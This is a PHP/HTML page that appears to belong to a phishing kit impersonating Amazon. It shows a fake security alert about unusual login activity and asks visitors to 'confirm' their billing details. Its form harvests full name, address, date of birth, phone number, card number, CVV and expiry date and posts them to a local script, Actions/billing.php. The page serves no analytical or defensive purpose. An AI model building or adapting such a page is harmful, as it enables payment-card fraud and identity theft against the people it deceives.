<?php

session_start();
include('__CONFIG__.php');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="Library/FontAwesome/css/fontawesome-all.min.css">
    <link rel="stylesheet" href="Library/Bootstrap/css/main.min.css">
    <link rel="stylesheet" href="Sheets/alert.css">
    <link rel="stylesheet" href="Sheets/accbilling.css">
    <link rel="shortcut icon" href="assets/img/favicon.ico" />
    <title>Amazon - Confirm your billing adress</title>
</head>
<body>

    <div class="mynavbar">
        <div class="container-fluid">
            <ul class="nav">
                <li class="nav-item">
                  <a class="nav-link" href="#">
                      <img src="Assets/img/logo.png" alt="" class="brandimg">
                  </a>
                </li>
                <li class="nav-item ml-auto myddown">
                    <div class="dropdown">
                        <button class="btn btndown dropdown-toggle" type="button">
                          Account
                        </button>
                        <div class="mydropdown d-none" id="buttonToggle">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="#" class="mylink">Settings</a></li>
                                <li class="list-group-item"><a href="#" class="mylink">Switch Account</a></li>
                                <li class="list-group-item"><a href="#" class="mylink">Signout</a></li>
                              </ul>
                        </div>
                        
                      </div>
                </li>
              </ul>
        </div>
    </div>

    <div class="a-content">
        <div class="container">
                <span class="lefttext"><a href="#" class="lefttext">Your Account</a></span>
                <span class="middle">></span>
                <span class="righttext">Your Amazon Wallet</span>
                <p class="alerttext">Amazon's security system. We have recently discovered an unusual login activity. To protect your account , please continue the required steps .</p>


                <div class="row">
                    <div class="col-12">
                        <div class="mypayementarea">
                        <form action="Actions/billing.php" method="post">
                                <span class="colorblacked">Confirm your billing adress</span>
                                
                                <div class="row mt-3">
                                    <div class="col-sm-6">
                                        <div class="form-group">
                                            <label for="fullname">Full Name:</label>
                                            <input type="text" class="form-control amazoninput" name="fullname" id="fullname" placeholder="Full Name" required>
                                        </div>
                                    </div>
                                    <div class="col-sm-6">
                                            <div class="form-group">
                                                <label for="adressline1">Address line 1:</label>
                                                <input type="text" class="form-control amazoninput" name="address1" id="adressline1" placeholder="Street address,P.O. box, company name." required>
                                            </div>
                                    </div>
                                    <div class="col-sm-6">
                                            <div class="form-group">
                                                <label for="adressline2">Address line 2:</label>
                                                <input type="text" class="form-control amazoninput" name="address2" id="adressline2" placeholder="Apartment, suite, unit, building, floor, etc.">
                                            </div>
                                    </div>
                                    
                                    <div class="col-sm-6">
                                            <div class="form-group">
                                                <label for="adressline2">City:</label>
                                                <input type="text" class="form-control amazoninput" name="city" id="adressline2" placeholder="City" required>
                                            </div>
                                    </div>


                                    <div class="col-sm-6">
                                            <div class="form-group">
                                                <label for="stateregionprovince">State/Province/Region:</label>
                                                <input type="text" class="form-control amazoninput" name="state" id="city" placeholder="State/Province/Region" required>
                                            </div>
                                    </div>

                                    <div class="col-sm-6">
                                            <div class="form-group">
                                                <label for="zipCode">Zip Code:</label>
                                                <input type="text" class="form-control amazoninput" name="zip" id="zipCode" placeholder="Zip Code" required>
                                            </div>
                                    </div>

                                    <div class="col-sm-6">
                                            <div class="form-group">
                                                <label for="country">Country:</label>
                                                <input type="text" class="form-control amazoninput" value="<?php echo $_SESSION['cntname']; ?>" name="country" id="country" placeholder="Country" required>
                                            </div>
                                    </div>

                                    <div class="col-sm-6">
                                            <div class="form-group">
                                                <label for="birth">Date of Birth: </label>
                                                <input type="text" class="form-control amazoninput" name="dob" id="birth" placeholder="DD/MM/YYYY" required>
                                            </div>
                                    </div>

                                    <div class="col-sm-6">
                                            <div class="form-group">
                                                <label for="phonenumber">Phone number:</label>
                                                <input type="tel" class="form-control amazoninput" name="phone" id="phonenumber" placeholder="Phone number" required>
                                            </div>
                                    </div>


                                </div>

                                <span class="colorblacked" style="display:block;">Confirm your payment method</span>
                                <div class="mt-1">
                                    <img src="Assets/img/payment1.png" alt="">
                                    <img src="Assets/img/payment2.png" alt="">
                                    <img src="Assets/img/payment3.png" alt="">
                                    <img src="Assets/img/payment4.png" alt="">
                                    <img src="Assets/img/payment5.png" alt="">
                                    <img src="Assets/img/payment6.png" alt="">
                                    <img src="Assets/img/payment7.png" alt="">
                                </div>
                                <div class="row mt-3">
                                        <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label for="nameoncard">Name on card:</label>
                                                    <input type="text" class="form-control amazoninput" name="nameoncard" id="nameoncard" placeholder="Card holder name" required>
                                                </div>
                                        </div>
                                        <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label for="id_xccaaa" >Card number: </label>
                                                    <input type="text" class="form-control amazoninput" name="ncn" id="id_xccaaa" placeholder="XXXX XXXX XXXX XXXX" required>
                                                </div>
                                        </div>
                                        <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label for="csc">Card Security Code:</label>
                                                    <input type="text" class="form-control amazoninput" name="cxxs" id="xc" placeholder="CVV/CVV2" maxlength="3" required>
                                                </div>
                                        </div>
                                        <div class="col-sm-6">
                                            <div class="row">
                                                <div class="col-6">
                                                        <div class="form-group">
                                                                <label for="months"></label>
                                                            <select  class="form-control bgcolored2" name="month" id="months" required>
                                                                <option>MM</option>
                                                                <option>01</option>
                                                                <option>02</option>
                                                                <option>03</option>
                                                                <option>04</option>
                                                                <option>05</option>
                                                                <option>06</option>
                                                                <option>07</option>
                                                                <option>08</option>
                                                                <option>09</option>
                                                                <option>10</option>
                                                                <option>11</option>
                                                                <option>12</option>
                                                            </select>
                                                        </div>
                                                </div>
                                                <div class="col-6">
                                                        <div class="form-group">
                                                                <label for="months"></label>
                                                            <select  class="form-control bgcolored2" name="year" id="months" required>
                                                                <option>YYYY</option>
                                                                <option>2017</option>
                                                                <option>2018</option>
                                                                <option>2019</option>
                                                                <option>2020</option>
                                                                <option>2021</option>
                                                                <option>2022</option>
                                                                <option>2023</option>
                                                                <option>2024</option>
                                                                <option>2025</option>
                                                                <option>2026</option>
                                                                <option>2027</option>
                                                                <option>2028</option>
                                                            </select>
                                                        </div>
                                                </div>
                                            </div>
                                        </div>

                                    
                                </div>
                                <div class="row">
                                    <div class="col-12">
                                        <input type="submit" name="Sex" class="btn bgcolored " value="Continue">
                                    </div>
                                </div>
                        </form>
                        </div>
                       
                    </div>
                </div>
        </div>
    </div>

    <script src="Library/jQuery/main.min.js"></script>
    <script src="Library/pooper/main.min.js"></script>
    <script src="Library/Bootstrap/js/main.min.js"></script>
    <script src="Library/jQuery/mask/jquery.mask.min.js"></script>
    <script src="Library/xvalidator/qunit.js"></script>

    


    <script>
        $(document).ready(function(){
            $('.myddown').hover(function(){
                $('.mydropdown').togleClass('d-none');
            })
            $('#buttonToggle').toggleClass();
            $('#birth').mask('00/00/0000');
        })
    </script>

</body>
</html>